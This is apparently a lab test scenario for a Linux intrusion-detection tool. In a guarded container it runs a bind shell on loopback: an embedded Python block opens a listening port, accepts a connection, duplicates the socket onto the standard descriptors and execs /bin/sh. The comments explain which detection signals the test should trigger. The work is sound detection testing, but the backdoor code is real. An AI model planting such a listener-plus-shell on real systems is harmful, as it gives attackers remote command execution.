#!/bin/bash
# Scenario: a bind shell -- a backdoor waiting for the attacker to connect in.
#   MITRE ATT&CK: T1059.004 (Unix Shell), T1571 (Non-Standard Port)
#   ks-expect: unexpected_listener
#   ks-run: lab
#
# The complement of reverse_shell_stdio. That one connects out; this one opens a
# port and waits. Both end the same way -- a shell with the socket on its
# standard descriptors -- but the listener half happens first, while nothing has
# happened yet and there is still time to act.
#
# Two signals come out of this, deliberately: unexpected_listener (25) when the
# port opens, and socket_backed_shell (70) when the shell inherits the socket.
# Neither the listener alone nor a bare exec would be worth an alert; together
# they are the whole attack, which is what chaining is for.
#
# The suite reports a score around 28 here, and that is not the chain -- it is
# the incident emitted the moment the port opened, before the shell existed.
# The later incident carries both signals and scores critical. Pinned by
# a_bind_shell_chains_its_listener_with_the_shell_that_follows in
# tests/replay_fixtures.rs, because a live run only ever shows the incident that
# matched its own ks-expect and says nothing about the other.
#
# Contained: --network none, loopback only, nothing leaves the container.
set -euo pipefail
if [[ ! -f /.ks-lab ]] || [[ "${KS_LAB:-}" != "1" ]]; then
	echo "refusing to run outside the kernelsentinel lab container" >&2
	exit 90
fi
command -v python3 >/dev/null || { echo "python3 required in the lab image" >&2; exit 90; }

# listen() before the fork, so the connect lands in the backlog and there is no
# readiness race -- the same structure reverse_shell_stdio uses.
python3 - <<'ENDPY'
import os, socket, sys

srv = socket.socket()
srv.bind(("127.0.0.1", 0))
srv.listen(1)                      # the backdoor opens its port
port = srv.getsockname()[1]

pid = os.fork()
if pid == 0:
    # The attacker connecting in.
    srv.close()
    c = socket.create_connection(("127.0.0.1", port))
    c.sendall(b"id\n")
    c.close()
    os._exit(0)

conn, _ = srv.accept()
srv.close()
# What a bind shell does on accept: hand the shell the socket.
for fd in (0, 1, 2):
    os.dup2(conn.fileno(), fd)
os.execv("/bin/sh", ["/bin/sh", "-c", "id"])
ENDPY

echo "[scenario] bind_shell: listened, accepted, exec'd a shell on the socket"
